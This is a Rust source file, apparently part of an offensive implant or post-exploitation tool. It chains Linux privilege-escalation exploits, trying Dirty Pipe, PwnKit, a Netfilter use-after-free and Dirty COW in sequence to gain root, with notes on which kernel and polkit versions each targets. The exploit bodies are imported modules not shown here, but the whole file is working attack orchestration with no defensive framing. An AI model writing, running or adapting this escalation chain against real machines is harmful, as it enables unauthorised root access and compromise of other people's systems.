mod cve_2024_1086;
mod cve_2022_0847;
mod cve_2021_4034;
mod cve_2016_5195;

use log::{info, error, warn};

pub fn execute(_cmd: &[u8]) -> Result<(), String> {
    info!("[PrivEsc:Linux] Attempting privilege escalation...");

    // Try Dirty Pipe first (simpler, 100% reliable on 5.8-5.16)
    info!("[PrivEsc] Trying CVE-2022-0847 (Dirty Pipe)...");
    let dirty_pipe = cve_2022_0847::Exploit::new();
    match dirty_pipe.run() {
        Ok(_) => {
            info!("[PrivEsc] SUCCESS via Dirty Pipe");
            return Ok(());
        }
        Err(e) => {
            warn!("[PrivEsc] Dirty Pipe failed: {}", e);
        }
    }

    // Try PwnKit (works on systems with vulnerable polkit < 0.120)
    info!("[PrivEsc] Trying CVE-2021-4034 (PwnKit)...");
    let pwnkit = cve_2021_4034::Exploit::new();
    match pwnkit.run() {
        Ok(_) => {
            info!("[PrivEsc] SUCCESS via PwnKit");
            return Ok(());
        }
        Err(e) => {
            warn!("[PrivEsc] PwnKit failed: {}", e);
        }
    }

    // Try Netfilter UAF (5.14-6.6 specific)
    info!("[PrivEsc] Trying CVE-2024-1086 (Netfilter UAF)...");
    let netfilter = cve_2024_1086::Exploit::new();
    match netfilter.run() {
        Ok(_) => {
            info!("[PrivEsc] SUCCESS via Netfilter");
            return Ok(());
        }
        Err(e) => {
            warn!("[PrivEsc] Netfilter failed: {}", e);
        }
    }

    // Last resort: Dirty COW for very old kernels (2.6.22 - 4.8)
    info!("[PrivEsc] Trying CVE-2016-5195 (Dirty COW)...");
    let dirty_cow = cve_2016_5195::Exploit::new();
    match dirty_cow.run() {
        Ok(_) => {
            info!("[PrivEsc] SUCCESS via Dirty COW");
            return Ok(());
        }
        Err(e) => {
            error!("[PrivEsc] Dirty COW failed: {}", e);
        }
    }

    Err("All methods failed".into())
}
